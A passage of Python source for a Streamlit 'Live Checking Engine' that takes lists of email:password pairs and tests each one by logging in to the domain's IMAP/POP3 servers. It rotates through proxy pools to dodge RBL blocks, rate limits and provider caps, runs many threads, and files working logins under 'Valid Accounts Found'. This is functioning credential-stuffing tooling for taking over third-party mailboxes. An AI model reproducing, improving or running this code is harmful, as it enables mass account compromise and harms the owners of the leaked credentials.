                                server_level_fail = True
                                rotate_now = False
                            elif st_val == RETRY:
                                saw_retry = True
                                server_level_fail = True
                                if "lookup failed" in err_text.lower():
                                    rotate_now = False
                                    trace_logs.append(f"{px_tag(px_used)} 'Lookup failed' on "
                                                      f"{server}:{port} -> advancing to next "
                                                      f"host (no proxy rotation)")
                                else:
                                    rotate_now = True
                            elif st_val == RBL:
                                trace_logs.append(f"{px_tag(px_used)} RBL block on "
                                                  f"{server}:{port} -> IP flagged by server, "
                                                  f"advancing")
                                server_level_fail = True
                            elif u_idx + 1 < len(users) and st_val in (UNKNOWN, LOGIN_DROPPED):
                                flags["saw_server"] = True
                                px_used, _ok = _rotate_to_fresh(px_used, seen_px,
                                                                "local-part retry", keep_node=True)
                                trace_logs.append(f"{px_tag(px_used)} Rejected as '{user}' -> "
                                                  f"retrying same host as local-part "
                                                  f"'{users[u_idx + 1]}'")
                                continue
                            elif st_val == LOGIN_DROPPED:
                                server_level_fail = True
                                rotate_now = False
                                trace_logs.append(
                                    f"{px_tag(px_used)} LOGIN_DROPPED on {server}:{port} -> "
                                    f"advancing the ladder (POP3 / other hosts still get a turn)")
                            else:
                                server_level_fail = True
                                rotate_now = rotate_now or proxy_level
                                if (_is_timeout(e) and _timeout_kind(e) == "connect"
                                        and not conn_rotated.get(server)):
                                    conn_rotated[server] = True
                                    rotate_now = True

                        if proxy_dead:
                            break
                        if server_level_fail:
                            break

                    # FIX P2-1: a same-node 407 retry only earns its slot if a REAL
                    # attempt still fits.  The old guard asked for 3s of window and
                    # then slept 0.8s and burned a full attempt.
                    if retry_same_node and (deadline_ts - time.time()) > (per_to * PROXY_407_RETRY_WINDOW_FACTOR):
                        trace_logs.append(
                            f"{px_tag(px_used)} 407 looks like the provider's per-sub-user cap "
                            f"-> settling {PROXY_407_BACKOFF}s and retrying the SAME node once")
                        time.sleep(PROXY_407_BACKOFF)
                        continue

                    if retry_same and (deadline_ts - time.time()) > 5.0:
                        trace_logs.append(
                            f"{px_tag(px_used)} Host answered slowly -> backoff "
                            f"{SLOW_RETRY_BACKOFF}s, retrying {server}:{port} in place "
                            f"[{retries_by_host.get(server, 0)}/{same_host_retries}]")
                        time.sleep(SLOW_RETRY_BACKOFF)
                        continue

                    can_rotate = (
                        rotate_now and px_used and rotations_left > 0
                        and (deadline_ts - time.time()) > max(2.0, per_to * 0.5)
                    )
                    if can_rotate:
                        time.sleep(ROTATE_SETTLE)
                        newpx = sample_alive_proxy(exclude=seen_px, avoid=seen_px, domain=domain)
                        if newpx and newpx not in seen_px:
                            seen_px.add(newpx)
                            px_used = newpx
                            rotations_left -= 1
                            trace_logs.append(f"{px_tag(px_used)} Rotating proxy -> retrying "
                                              f"{server}:{port} "
                                              f"(host kept, {'407' if proxy_dead else 'net'})")
                            continue

                    if proxy_dead and acct_407 >= PROXY_407_FORCE_DIRECT:
                        trace_logs.append(
                            f"407 storm breaker: {acct_407} proxy-auth failure(s) in this rung "
                            f"-> bypassing the remaining hosts and going DIRECT.")
                        force_direct["flag"] = True
                        return None, had_net, saw_retry

                    break

            return None, had_net, saw_retry
# @@END 102 CORE_SWEEP

# @@BLOCK 103 CORE_PHASES deps=010,016,100,102
        def run_phase(px_used, plan_used, deadline_ts, tag):
            if not plan_used:
                return None, False, False

            res, net, ret = sweep(px_used, plan_used, deadline_ts, f"{tag} · pass 1",
                                  allow_rotate=True)
            if res or force_direct["flag"]:
                return res, net, ret

            if CFG.get("CHECK_PASS2", CHECK_PASS2_DEFAULT) and net \
                    and (deadline_ts - time.time()) > 3.0:
                retry_rungs = [r for r in plan_used if r[1] in net_failed_hosts]
                if retry_rungs:
                    res2, net2, ret2 = sweep(px_used, retry_rungs, deadline_ts,
                                             f"{tag} · pass 2 (fresh proxy per failed host)",
                                             allow_rotate=True)
                    return res2, (net or net2), (ret or ret2)
            return None, net, ret

        direct_first = bool(CFG.get("DIRECT_FIRST", False))
        if proxy_mode == "off":
            direct_first = True
        if not direct_first and proxy_pool:
            try:
                if quarantine_size() >= max(3, int(len(proxy_pool) * 0.5)):
                    direct_first = True
                    trace_logs.append(f"Pool {quarantine_size()}/{len(proxy_pool)} quarantined "
                                      f"-> auto Direct-First.")
            except Exception:
                pass

        allow_proxy = bool(px) and proxy_mode != "off" and not proxy_is_quarantined(px)
        direct_gate = (px is None or proxy_mode == "fallback"
                       or bool(CFG.get("RETRY_CONNECTION_FAILED")) or force_direct["flag"]
                       or flags["saw_407"])
        allow_direct = bool(direct_gate)

        def _run_direct(primary_dl, hard_dl):
            nonlocal retryable
            dp = [r for r in primary_plan if fast_fail_dns_check(r[1])] or primary_plan
            df = [r for r in fallback_plan if fast_fail_dns_check(r[1])]
            dgeo = direct_geo()
            trace_logs.append(f"direct | {dgeo['ip']} | {dgeo['region']} | "
                              f"{dgeo['country']} | {dgeo['vpn']}")
            trace_logs.append(f"DIRECT sweep over {len(dp)} locally-resolving host(s).")
            res, _nf, ret = run_phase(None, dp, primary_dl, "direct")
            retryable = retryable or ret
            if res:
                return res
            if (hard_dl - time.time()) > 4.0:
                res, _nf2, _r = run_phase(None, df, hard_dl, "direct/legacy")
                if res:
                    return res
            return None

        def _run_proxy(primary_dl, hard_dl):
            nonlocal retryable, net_fail
            if not allow_proxy:
                if proxy_mode != "off" and not proxy_pool:
                    trace_logs.append("No live proxy in the pool -> running only the DIRECT sweep.")
                return None
            res, nf, ret = run_phase(px, primary_plan, primary_dl, "proxy")
            retryable = retryable or ret
            net_fail = net_fail or nf
            if res:
                return res
            if not force_direct["flag"] and (hard_dl - time.time()) > 4.0:
                res, _n, _r = run_phase(px, fallback_plan, hard_dl, "proxy/legacy")
                if res:
                    return res
            return None

        if direct_first and allow_direct:
            trace_logs.append("Phase order: DIRECT first, proxy as fallback.")
            res = _run_direct(t_start + (budget * DIRECT_FIRST_DIRECT_PRIMARY_FRAC),
                              t_start + (budget * DIRECT_FIRST_DIRECT_TOTAL_FRAC))
            if res:
                return res
            if allow_proxy:
                res = _run_proxy(t_start + (budget * DIRECT_FIRST_PROXY_START_FRAC),
                                 hard_deadline)
                if res:
                    return res
        else:
            res = _run_proxy(proxy_primary_deadline, proxy_deadline)
            if res:
                return res
            if force_direct["flag"]:
                trace_logs.append("407 storm breaker tripped -> bypassing the rest of the "
                                  "proxy pool and running the DIRECT sweep now.")
            # FIX P0-2: allow_direct was latched BEFORE the proxy phase ran, so in
            # Proxy Mode = aggressive with Retry CF off a 407-flooded proxy phase
            # could never fall through to DIRECT - the direct_reason fix was
            # defeated one line later by the frozen gate.  Recompute it now that
            # we know what actually happened.
            allow_direct = (allow_direct or force_direct["flag"] or flags["saw_407"]
                            or acct_407_total > 0 or net_fail or retryable)
            direct_reason = (px is None) or net_fail or retryable or force_direct["flag"] \
                or flags["saw_407"] or acct_407_total > 0
            if allow_direct and direct_reason:
                res = _run_direct(direct_primary_deadline, hard_deadline)
                if res:
                    return res
# @@END 103 CORE_PHASES

# @@BLOCK 104 CORE_TAIL deps=016,023,100,103
    except Exception as e:
        trace_logs.append(f"Critical Exception in runner: {str(e)}")
        if best_verdict["status"] is not None:
            return (None, best_verdict["status"],
                    best_verdict["detail"] or "retained verdict", None, trace_logs)
        return None, FAILED, str(e)[:40], None, trace_logs

    if best_verdict["status"] is not None:
        _bh = best_verdict.get("host") or ""
        _foreign = bool(_bh) and not _is_local_host(_bh)
        detail = best_verdict["detail"] or "retained verdict"
        if _foreign:
            detail = f"{detail} [retained via FOREIGN host {_bh}]"
            trace_logs.append(f"NOTE: the retained verdict came from {_bh}, which is not a "
                              f"local host for {domain}. It may belong to a different provider.")
        if best_verdict["status"] == WRONG:
            _wn = _wrong_detail_note(domain, password)
            if _wn and _wn not in detail:
                detail = detail + _wn
        if best_verdict["status"] == LOGIN_DROPPED:
            detail = f"{detail} | " + _login_dropped_detail()
        trace_logs.append("Ladder exhausted with no live answer -> returning retained "
                          f"verdict [{best_verdict['status']}].")
        return None, best_verdict["status"], detail, None, trace_logs

    if flags["saw_407"] and not flags.get("saw_server") \
            and acct_407_total >= PROXY_407_FORCE_DIRECT:
        trace_logs.append(
            f"Every attempt died in the PROXY hop ({acct_407_total} x 407, "
            f"{quarantine_size()} node(s) quarantined) -> the mailbox was never "
            f"reached, so the password is still untested. Per-host 407 map: {host_407}")
        return None, PROXY_UNHEALTHY, (
            f"proxy refused the MAIL ports with 407 on {acct_407_total} attempt(s) - the mail "
            f"host was never reached; the pool passes the web probe but cannot pass "
            f"email-server destinations (provider 'email servers' cap)"
        ), None, trace_logs
    if not dns_ok and not flags.get("saw_server") and not flags.get("saw_login_drop"):
        return None, DNS_FAILED, "Fast-fail DNS check failed: no host resolves locally", None, trace_logs
    if flags.get("saw_login_drop"):
        trace_logs.append(
            "Mail host answered, accepted the LOGIN command, then closed the socket "
            "(* BYE) before returning a verdict - server-side drop, not a network fault.")
        return None, LOGIN_DROPPED, _login_dropped_detail(), None, trace_logs
    if retryable:
        return None, RETRY, "retryable (proxy / IP-block / rate-limit)", None, trace_logs
    if flags.get("saw_server"):
        trace_logs.append(
            "Hosts answered and LOGIN was issued, but every server dropped the "
            "connection before a verdict -> password still untested.")
        return None, FAILED, (
            "mail host reached but the server dropped LOGIN (server-side) - try the "
            "other protocol/host, or an app password"
        ), None, trace_logs
    return None, FAILED, ("all hosts unreachable (timeouts/refused) - password could not "
                          "be tested"), None, trace_logs
# @@END 104 CORE_TAIL

# @@BLOCK 105 RUN_TRIGGER_UI deps=034,055,083,087
section_title("🚀", "Execute Live Checking Engine",
              "proxy-backed, post-auth verified, resumable")

RESULT_ACTION_MODES = BUCKETS
ACTION_OPTIONS = list(PREFILTER_LABELS) + [label for label, _ in BUCKETS]

col_action1, col_action2 = str_lit.columns([0.65, 0.35])
with col_action1:
    start_engine_btn = str_lit.button("🔥 Start Live Checking Engine", type="primary")
    stop_engine_btn = str_lit.button(
        "⏹ Stop Engine (records the reason)",
        help="A click reruns the script, which kills the run loop. Stop stamps the "
             "reason on the run record FIRST, then reruns, so the next page load "
             "reports 'Stopped by user' and leaves the queue resumable.")
with col_action2:
    engine_action_mode = str_lit.selectbox(
        "Engine Action Mode:", options=ACTION_OPTIONS, index=0,
        key="bb_action_mode",
        help="Pick a pre-filter bucket (SMTP Failed sits right after DNS Failed) or a "
             "previous result bucket to re-run."
    )
    if engine_action_mode == "Resume Unfinished":
        # runstate.summary() reads the watchdog record, so this is the truth about
        # whether anything is actually resumable - not a glob that always matched.
        _rs_lines = runstate.summary()
        if _rs_lines:
            for _rs_line in _rs_lines:
                str_lit.text(_rs_line)
        else:
            str_lit.caption("No interrupted run recorded.")

active_proxy_pool = get_filtered_active_proxies()

# The stop is a rerun with a reason attached: the click tears the loop down
# before anything below executes, so the stamp has to happen here and the
# interrupt itself is performed by block 007 on the next load.
if stop_engine_btn and STATE.get("run_active"):
    runstate.note("Stopped by user (Stop button)")
    str_lit.rerun()

if start_engine_btn:
    clear_proxy_quarantine()
    log_probe_event("run start: 407 quarantine cleared")
    progress_bar = str_lit.progress(0, text=f"Initializing checking engine "
                                            f"for [{engine_action_mode}]...")
    status_text = str_lit.empty()
    status_text.info("⏳ Opening the engine - resolving hosts, pre-testing the proxy pool, "
                     "geo-tagging nodes.")

    log_startup(f"Live checking engine execution triggered in [{CFG['MODE_NAME']}] mode "
                f"on category: [{engine_action_mode}].")
    log_startup(
        f"RUN CONFIG -> protocols={CFG.get('PROTOCOLS')} workers={CFG.get('MAX_WORKERS_START')} "
        f"deadline={CFG.get('ACCOUNT_DEADLINE')}s "
        f"proxy_mode={CFG.get('PROXY_MODE')} hosts/domain={CFG.get('MAX_HOSTS_PER_DOMAIN')} "
        f"starttls={CFG.get('TRY_STARTTLS')} alt_user={CFG.get('TRY_ALT_USERNAME')} "
        f"confirm_wrong={CFG.get('CONFIRM_WRONG_ACROSS_HOSTS')} "
        f"retry_direct={CFG.get('RETRY_CONNECTION_FAILED')} debug={CFG.get('DEBUG')} "
        f"test_flight={CFG.get('PROXY_TEST_FLIGHT')} "
        f"allow_blacklist={CFG.get('ALLOW_BLACKLIST_IPS')} "
        f"random_rotation={CFG.get('RANDOM_ROTATION')} geo_call={CFG.get('GEO_CALL')} "
        f"smtp_precheck={CFG.get('SMTP_CHECK')} connection={CFG.get('CONNECTION_HINT')} "
        f"host_conc={CFG.get('HOST_CONCURRENCY')} ip_conc={CFG.get('PROXY_IP_CONCURRENCY')} "
        f"subuser_conc={CFG.get('PROXY_SUBUSER_CONCURRENCY')} "
        f"proxy_conc={CFG.get('PROXY_CONCURRENCY')} "
        f"max_rotations={CFG.get('MAX_ROTATIONS')} check_pass2={CFG.get('CHECK_PASS2')} "
        f"direct_first={CFG.get('DIRECT_FIRST')} mail_spot={CFG.get('MAIL_SPOT_CHECK')}"
    )

    resume_lines = []
    if engine_action_mode == "Resume Unfinished":
        resume_lines = runstate.remaining()

    _label_to_key = dict(RESULT_ACTION_MODES)

    def _raw_of(line):
        return line.split("|")[0].strip()

    category_queue_map = {
        "Ready to Check": clean_lines,
        "Resume Unfinished": resume_lines,
        "Disposables": disp,
        "Typos": typo,
        "Skip previously valid": resume,
        "App-Skipped": app_skip,
        "Custom Filtered": custom_skipped,
        "DNS Failed": dns_skipped,
        "SMTP Failed": smtp_skipped,
    }
    if engine_action_mode in _label_to_key:
        category_queue_map[engine_action_mode] = [
            _raw_of(x) for x in str_lit.session_state.get(_label_to_key[engine_action_mode], [])
        ]

    accounts_to_check = category_queue_map.get(engine_action_mode, [])

    if not accounts_to_check:
        str_lit.warning(f"⚠ No accounts found in the selected category: "
                        f"'{engine_action_mode}'.")
        if engine_action_mode == "Resume Unfinished":
            _rec = runstate.load() or {}
            str_lit.caption(
                f"Record: state={_rec.get('state', 'none')} | "
                f"{_rec.get('checked', 0)}/{_rec.get('total', 0)} checked | "
                f"reason={_rec.get('reason') or _rec.get('cause') or 'none'} | "
                f"remaining file={'present' if runstate.remaining() else 'empty/absent'}")
    else:
        # v13.48: active_proxy_pool a few lines up ALREADY holds the filtered pool
        # for this rerun. Re-running get_filtered_active_proxies() re-read and
        # re-filter all of proxies.txt for the same answer.
        filtered_pool[:] = active_proxy_pool

        # FIX ISO-4 (v13.49): runs_active is the truth and run_active is derived,
        # so one user's exit can no longer tell another user's prober that the
        # deployment is idle.
        STATE["runs_active"] = int(STATE.get("runs_active", 0)) + 1
        STATE["run_active"] = True
        str_lit.session_state["run_active"] = True

        _prev_tg = list(STATE.get("probe_targets_override") or [])
        _tg = _set_probe_targets_from_queue(
            accounts_to_check,
            cap=max(1, int(CFG.get("PROBE_MAX_TARGETS", PROBE_MAX_TARGETS_DEFAULT))))
        _targets_changed = bool(_tg) and list(_tg) != _prev_tg

        with alive_pool_lock:
            _pool_warm = bool(alive_pool)

        if not _pool_warm:
            with str_lit.spinner("Cold pool - waiting for the probe to finish..."):
                _t0 = time.time()
                while _PROBE_OWNER_LOCK.locked() and (time.time() - _t0) < (PROBE_BUDGET_START + 10):
                    time.sleep(0.2)
                with alive_pool_lock:
                    _pool_warm = bool(alive_pool)
                if not _pool_warm:
                    refresh_alive_pool(force=True, budget=PROBE_BUDGET_START)
                    with alive_pool_lock:
                        _pool_warm = bool(alive_pool)
        elif _targets_changed and CFG.get("PROBE_TARGET", PROBE_TARGET_DEFAULT) == PROBE_TARGET_AUTO:
            threading.Thread(
                target=lambda: refresh_alive_pool(force=True, budget=PROBE_BATCH_BUDGET),
                daemon=True, name="start-refresh").start()
            log_probe_event("start: pool warm, target changed -> background refresh, "
                            "run starts immediately")

        if alive_pool:
            active_proxy_pool = list(alive_pool)
        elif CFG.get("PROBE_STRICT", PROBE_STRICT_DEFAULT):
            active_proxy_pool = []
        else:
            active_proxy_pool = list(filtered_pool)

        log_startup(
            f"PROXY HEALTH BANNER -> loaded={len(all_proxies)} filtered={len(filtered_pool)} "
            f"alive={len(alive_pool)} quarantined={quarantine_size()}"
        )
        _msr = STATE.get("mail_spot") or {}
        if _msr.get("auth") and not _msr.get("ok") and _msr.get("n"):
            str_lit.error(
                f"🚨 **The mail-destination spot check says the pool cannot reach MAIL "
                f"ports** - {_msr['auth']}/{_msr['n']} sampled node(s) returned 407 "
                f"against {_msr['host']}:{_msr['port']}. Every one of those nodes was "
                f"re-tested on 443 first, so read the histogram: 'auth' means the node "
                f"itself failed and the credential/plan is the problem, 'auth_dest' means "
                f"the node is fine and only the mail port is refused. Either way the "
                f"passwords are untested - set **Proxy Mode Engine = off** (DIRECT)."
            )
        if all_proxies and not alive_pool:
            str_lit.warning(
                "⚠ **Proxy health: 0 nodes passed the tunnel probe.** Every account will run "
                "DIRECT. Press 📥 Fetch & Test All Proxies, then try again - that is a pool "
                "problem, not a mailbox problem."
            )

        with session_state_lock:
            str_lit.session_state.valid_results = load_persistent_valid_results()
            str_lit.session_state.run_valid_count = 0
            str_lit.session_state.clean_valid_count = 0
            str_lit.session_state.wrong_results = []
            str_lit.session_state.need_app_results = []
            str_lit.session_state.conn_results = []
            str_lit.session_state.proxy_results = []
            str_lit.session_state.login_drop_results = []
            str_lit.session_state.retry_results = []
            str_lit.session_state.rbl_results = []
            str_lit.session_state.smtp_results = list(str_lit.session_state.get("pre_smtp_failed", []))
            str_lit.session_state.dns_results = list(str_lit.session_state.get("pre_dns_failed", []))
            str_lit.session_state.skip_results = []
            str_lit.session_state.unknown_results = []
            str_lit.session_state.report_entries = []
            str_lit.session_state.log_lines = []
            str_lit.session_state.checked_emails_set = set()
            str_lit.session_state.last_checked_index = 0
            str_lit.session_state.engine_has_run = True
            str_lit.session_state.run_completion_status = "Unfinished"

            start_dt = datetime.now()
            str_lit.session_state.start_timestamp = start_dt.strftime("%Y-%m-%d %H:%M:%S")
            str_lit.session_state.end_timestamp = None
            str_lit.session_state.total_duration = None

        exec_tab1, exec_tab2 = str_lit.tabs(["⚡ Live Execution Stream",
                                             "📊 Live Report Log & Analytics"])
        with exec_tab1:
            log_container = str_lit.empty()
        with exec_tab2:
            report_metrics_placeholder = str_lit.empty()
            bucket_placeholders = {}
            BUCKET_SPEC = [
                ("valid_results", "✅ Valid Accounts Found"),
                ("wrong_results", "❌ Wrong Password Found"),
                ("login_drop_results", "🚪 Login Dropped (* BYE)"),
                ("conn_results", "🔌 Connection Failed Found"),
                ("proxy_results", "🩹 Proxy Unhealthy Found"),
                ("need_app_results", "🔐 App Password / 2FA Found"),
                ("retry_results", "🕓 RETRY_LATER Found"),
                ("rbl_results", "🚫 RBL Blocked Found"),
                ("smtp_results", "📮 SMTP Failed (pre-check)"),
                ("dns_results", "🛰 DNS Failed (pre-check)"),
                ("skip_results", "⏭ Skipped / Filtered"),
                ("unknown_results", "❓ Unclassified"),
            ]
            for _key, _title in BUCKET_SPEC:
                with str_lit.expander(f"{_title}", expanded=False):
                    bucket_placeholders[_key] = str_lit.empty()
            report_log_container = str_lit.empty()

        all_target_accounts = (accounts_to_check[:CFG["MAX_ACCOUNTS"]]
                               if CFG["MAX_ACCOUNTS"] > 0 else accounts_to_check)
        total_accs = len(all_target_accounts)
        checked_count = 0
        # The queue is final and counted - open the run record here.
        _rs_path = runstate.begin(total_accs)
        thread_local = threading.local()
        log_cap = LOG_CAP_DEBUG if CFG.get("DEBUG", False) else LOG_CAP_QUIET
        _last_ui_ts = 0.0
        _last_df_ts = 0.0
        _last_ck_ts = 0.0
        _net_streak = 0

        def render_buckets(snapshot):
            for key, title in BUCKET_SPEC:
                ph = bucket_placeholders.get(key)
                if ph is None:
                    continue
                items = snapshot.get(key) or []
                with ph.container():
                    if not items:
                        str_lit.caption("nothing here yet")
                        continue
                    str_lit.caption(f"{len(items)} account(s)")
                    col = TAG_COLORS.get(BUCKET_TAGS.get(key, ""), "#cbd5e1")
                    for ln in items[-BUCKET_RENDER_TAIL:]:
                        str_lit.markdown(
                            f"<div style='font-family:ui-monospace,monospace;font-size:12px;"
                            f"color:{col}'>{html.escape(str(ln))}</div>",
                            unsafe_allow_html=True,
                        )

        def check_task(line):
            try:
                if ":" not in line:
                    return {"line": f"{line} | Error: Invalid format", "status": FAILED,
                            "trace": ["Invalid format"]}
                email, password = line.split(":", 1)
                email, password = email.strip(), password.strip()
                reason = drop_before_check(email)
                if reason:
                    return {"line": f"{email}:{password} | {reason}", "email": email,
                            "password": password, "status": SKIP, "detail": reason,
                            "trace": [reason]}
                domain = email.split("@")[-1].lower()
                conf = get_servers(email)
                if not hasattr(thread_local, "state"):
                    thread_local.state = {}
                server, status, detail, px_used, trace = check_account_sync(
                    email, password, conf, domain, active_proxy_pool, thread_local.state)
                return {"line": f"{email}:{password} | {detail}", "email": email,
                        "password": password, "status": status, "detail": detail,
                        "trace": trace}
            except Exception as ex:
                return {"line": f"{line} | Error: {ex}", "email": line, "password": "",
                        "status": FAILED, "detail": str(ex), "trace": [str(ex)]}
            finally:
                if hasattr(thread_local, "state"):
                    try:
                        thread_local.state.clear()
                    except Exception:
                        pass
# @@END 105 RUN_TRIGGER_UI

# @@BLOCK 106 RUN_LOOP deps=009,014,083,105
        detected_stop_reason = "Interrupted / Stopped before completion"
        run_interrupted = False
        _orig_deadline = CFG.get("ACCOUNT_DEADLINE")
        try:
            current_workers = CFG["MAX_WORKERS_START"]
            if CFG.get("DYNAMIC_WORKER_SCALING", False):
                if total_accs > 500:
                    current_workers = min(100 if CFG.get("FAST_MODE", True) else 35,
                                          CFG["MAX_WORKERS_START"] * 2)
                elif total_accs < 20:
                    current_workers = max(2, min(5, total_accs))

            # FIX LAG-2: the metric cells are built ONCE, here. Rebuilding 14
            # st.columns inside every 0.12s tick was the single biggest per-tick
            # cost, and that cost grew with the result set - so it was at its
            # worst exactly when the queue was at its shortest.
            # FIX LAG-6: the labels are their own list. The first version paired
            # the placeholders with a list of INTEGERS but kept the old
            # `(_ml, _mv)` double-unpack, so every tick raised "cannot unpack
            # non-iterable int object" inside the per-account try/except. It was
            # swallowed, and it aborted the checkpoint, the progress bar and the
            # bucket render on every tick while looking like a harmless log line.
            _metric_labels = [
                "✅ Valid", "❌ Wrong", "🔑 AppPass/2FA",
                "🚪 Login Dropped", "🔌 Conn Failed", "🩹 Proxy Dead",
                "🕓 RETRY_LATER", "🚫 RBL", "📮 SMTP Failed",
                "⏭ Skipped", "❓ Unclassified", "📋 Checked",
                "📚 Queue",
            ]
            with report_metrics_placeholder.container():
                _metric_phs = [c.empty() for c in metric_grid(_metric_labels, per_row=3)]

            # FIX LAG-3: an explicit executor, not `with`. ThreadPoolExecutor's
            # __exit__ calls shutdown(wait=True), so a teardown mid-run blocked
            # until EVERY queued account finished before the page could come back.
            executor = ThreadPoolExecutor(max_workers=current_workers)
            try:
                future_to_line = {executor.submit(check_task, line): line
                                  for line in all_target_accounts}

                for index, future in enumerate(as_completed(future_to_line), 1):
                    checked_count += 1
                    # FIX LAG-4: the tail is the slowest work by construction -
                    # everything still queued has already exhausted most of its
                    # ladder. Once only one worker-cohort is left, cap the budget
                    # so the last few accounts cannot each spend the full slider.
                    _tail_left = total_accs - checked_count
                    if _tail_left and _tail_left <= current_workers:
                        try:
                            CFG["ACCOUNT_DEADLINE"] = min(
                                int(CFG.get("ACCOUNT_DEADLINE", DEADLINE_NORMAL)), 45)
                        except Exception:
                            pass
                    try:
                        res = future.result(
                            timeout=max(30, int(CFG["ACCOUNT_DEADLINE"])) + WORKER_FUTURE_PAD)
                        if res:
                            st_val = res["status"]
                            em_val = res.get('email', '').strip().lower()

                            # Connection-loss evidence: consecutive transport-ish
                            # verdicts. One bad host is normal; eight in a row is
                            # not, so stamp it on the record while it is happening.
                            if st_val in (CONNECTION_FAILED, PROXY_UNHEALTHY,
                                          DNS_FAILED, RETRY):
                                _net_streak += 1
                                if _net_streak == NET_STREAK_TRIP:
                                    runstate.note(
                                        f"{_net_streak} consecutive transport failures "
                                        f"(last: {st_val}) - connection looks down")
                                    log_probe_event(
                                        f"run: {_net_streak} consecutive transport "
                                        f"failures ({st_val}) - connection looks down")
                            else:
                                _net_streak = 0

                            # FIX LAG-1: decide the UI tick BEFORE doing any list copies.
                            _now_ui = time.time()
                            _tick = (checked_count >= total_accs) or \
                                    ((_now_ui - _last_ui_ts) >= UI_MIN_INTERVAL)
                            _df_tick = ((checked_count >= total_accs)
                                        or ((_now_ui - _last_df_ts) >= REPORT_DF_MIN_INTERVAL))

                            with session_state_lock:
                                if em_val:
                                    str_lit.session_state.checked_emails_set.add(em_val)
                                if st_val == VALID:
                                    if res["line"] not in str_lit.session_state.valid_results:
                                        str_lit.session_state.valid_results.append(res["line"])
                                        str_lit.session_state.run_valid_count += 1
                                    str_lit.session_state.clean_valid_count = \
                                        str_lit.session_state.run_valid_count
                                elif st_val == WRONG:
                                    str_lit.session_state.wrong_results.append(res["line"])
                                elif st_val == APP:
                                    str_lit.session_state.need_app_results.append(res["line"])
                                elif st_val == LOGIN_DROPPED:
                                    str_lit.session_state.login_drop_results.append(res["line"])
                                elif st_val == RETRY:
                                    str_lit.session_state.retry_results.append(res["line"])
                                elif st_val == RBL:
                                    str_lit.session_state.rbl_results.append(res["line"])
                                elif st_val == SMTP_FAILED:
                                    str_lit.session_state.smtp_results.append(res["line"])
                                elif st_val == DNS_FAILED:
                                    str_lit.session_state.dns_results.append(res["line"])
                                elif st_val == PROXY_UNHEALTHY:
                                    str_lit.session_state.proxy_results.append(res["line"])
                                elif st_val == SKIP:
                                    str_lit.session_state.skip_results.append(res["line"])
                                elif st_val == UNKNOWN:
                                    str_lit.session_state.unknown_results.append(res["line"])
                                else:
                                    str_lit.session_state.conn_results.append(res["line"])

                                str_lit.session_state.log_lines.append(
                                    f"[{st_val.upper()}] {res.get('email', '')} -> "
                                    f"{res.get('detail', '')}")
                                if len(str_lit.session_state.log_lines) > log_cap:
                                    str_lit.session_state.log_lines.pop(0)

                                trace_text = "\n  ↳ ".join(
                                    res.get("trace", ["No trace recorded"]))
                                cred_combo = (f"{res.get('email', '')}:{res.get('password', '')}"
                                              if res.get('password') else res.get('email', ''))
                                str_lit.session_state.report_entries.append({
                                    "Time": datetime.now().strftime("%H:%M:%S"),
                                    "Email:Password": cred_combo,
                                    "Status": st_val.upper(),
                                    "Under-The-Hood Background Trace":
                                        f"Result: {res.get('detail', '')}\n"
                                        f"Steps Executed:\n  ↳ {trace_text}",
                                })
                                if len(str_lit.session_state.report_entries) > REPORT_ENTRIES_MAX:
                                    del str_lit.session_state.report_entries[:-REPORT_ENTRIES_MAX]

                                valid_len = len(str_lit.session_state.valid_results)
                                wrong_len = len(str_lit.session_state.wrong_results)
                                need_len = len(str_lit.session_state.need_app_results)
                                login_drop_len = len(str_lit.session_state.login_drop_results)
                                conn_len = len(str_lit.session_state.conn_results)
                                proxy_len = len(str_lit.session_state.proxy_results)
                                retry_len = len(str_lit.session_state.retry_results)
                                rbl_len = len(str_lit.session_state.rbl_results)
                                smtp_len = len(str_lit.session_state.smtp_results)
                                skip_len = len(str_lit.session_state.skip_results)
                                unknown_len = len(str_lit.session_state.unknown_results)
                                current_logs = (list(str_lit.session_state.log_lines)
                                                if _tick else [])
                                # FIX LAG-5: up to 2000 entries were copied on every
                                # tick; they are only needed when the table redraws.
                                current_reports = (list(str_lit.session_state.report_entries)
                                                   if _df_tick else [])
                                bucket_snapshot = ({
                                    "valid_results": list(str_lit.session_state.valid_results),
                                    "wrong_results": list(str_lit.session_state.wrong_results),
                                    "conn_results": list(str_lit.session_state.conn_results),
                                    "proxy_results": list(str_lit.session_state.proxy_results),
                                    "login_drop_results": list(str_lit.session_state.login_drop_results),
                                    "need_app_results": list(str_lit.session_state.need_app_results),
                                    "retry_results": list(str_lit.session_state.retry_results),
                                    "rbl_results": list(str_lit.session_state.rbl_results),
                                    "smtp_results": list(str_lit.session_state.smtp_results),
                                    "dns_results": list(str_lit.session_state.dns_results),
                                    "skip_results": list(str_lit.session_state.skip_results),
                                    "unknown_results": list(str_lit.session_state.unknown_results),
                                } if _tick else {})

                            if _tick:
                                _last_ui_ts = _now_ui
                                if str_lit.session_state.get("colorize_logs", True):
                                    log_container.markdown(colorize_logs(current_logs[-120:]),
                                                           unsafe_allow_html=True)
                                else:
                                    log_container.code("\n".join(current_logs[-120:]), language="text")

                                _vals = [valid_len, wrong_len, need_len, login_drop_len,
                                         conn_len, proxy_len, retry_len, rbl_len,
                                         smtp_len, skip_len, unknown_len,
                                         checked_count, total_accs]
                                for _ph, _ml, _mv in zip(_metric_phs, _metric_labels, _vals):
                                    _ph.metric(_ml, _mv)

                                render_buckets(bucket_snapshot)

                                if _df_tick:
                                    _last_df_ts = _now_ui
                                    report_log_container.dataframe(
                                        pd.DataFrame(current_reports[::-1]),
                                        width="stretch", height=320)

                    except Exception as ex:
                        err_msg = f"[EXCEPTION] {str(ex)}"
                        with session_state_lock:
                            str_lit.session_state.conn_results.append(err_msg)
                            str_lit.session_state.log_lines.append(err_msg)
                            current_logs = list(str_lit.session_state.log_lines)
                        if str_lit.session_state.get("colorize_logs", True):
                            log_container.markdown(colorize_logs(current_logs[-120:]),
                                                   unsafe_allow_html=True)
                        else:
                            log_container.code("\n".join(current_logs[-120:]), language="text")

                    # Checkpoint on TIME as well as on count. The counter alone
                    # meant a 47-account run never reached a checkpoint before a
                    # teardown: checked stayed 0, the heartbeat went stale and
                    # unfinished_live.json was never written, so Resume was empty
                    # and the stop had no reason.
                    _now_ck = time.time()
                    if ((checked_count % 100 == 0) or (checked_count == total_accs)
                            or (_now_ck - _last_ck_ts) >= CHECKPOINT_SECONDS):
                        _last_ck_ts = _now_ck
                        # Heartbeat first: this is what stops tick() from calling a
                        # healthy long run interrupted on the next page load.
                        runstate.progress(checked_count, total_accs)
                        with session_state_lock:
                            done = set(str_lit.session_state.checked_emails_set)
                            valids = list(str_lit.session_state.valid_results)
